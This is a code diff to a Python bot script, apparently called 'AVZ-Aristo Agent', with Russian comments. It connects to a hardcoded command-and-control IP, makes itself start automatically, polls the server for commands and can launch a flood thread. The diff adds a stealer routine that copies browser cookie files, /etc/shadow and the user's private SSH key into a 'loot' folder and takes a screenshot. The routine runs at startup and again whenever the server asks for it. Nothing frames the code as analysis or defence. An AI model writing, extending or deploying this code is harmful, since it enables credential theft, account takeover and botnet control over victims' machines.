@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Agent v26.7 – ping, автозагрузка, xor
-import socket, json, time, os, platform, subprocess, threading, random, base64
+# AVZ-Aristo Agent v26.8 – сбор cookies, паролей, скриншотов
+import socket, json, time, os, platform, subprocess, threading, random, base64, glob, shutil
 
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
@@ -47,6 +47,22 @@ def register():
     except:
         pass
 
+def grab_data():
+    """Собирает cookies, пароли, скриншоты"""
+    loot_dir = "loot"
+    os.makedirs(loot_dir, exist_ok=True)
+    # Cookies
+    for browser in ["chrome", "firefox", "edge"]:
+        for f in glob.glob(f"~/.config/{browser}/**/Cookies", recursive=True):
+            shutil.copy(f, loot_dir)
+    # Пароли
+    for f in ["/etc/shadow", "~/.ssh/id_rsa"]:
+        if os.path.exists(os.path.expanduser(f)):
+            shutil.copy(os.path.expanduser(f), loot_dir)
+    # Скриншот (Linux)
+    if shutil.which("import"):
+        subprocess.run(f"import -window root {loot_dir}/screenshot.png", shell=True)
+
 def send_ping():
     try:
         s = socket.socket(); s.settimeout(5)
@@ -63,6 +79,7 @@ def send_ping():
 def main():
     auto_start()
     register()
+    grab_data()
     while True:
         cmds = send_ping()
         for cmd in cmds:
@@ -77,6 +94,8 @@ def main():
                         except:
                             pass
                 threading.Thread(target=flood, daemon=True).start()
+            elif cmd.get("type") == "grab":
+                grab_data()
         time.sleep(15)
 
 if __name__ == "__main__":
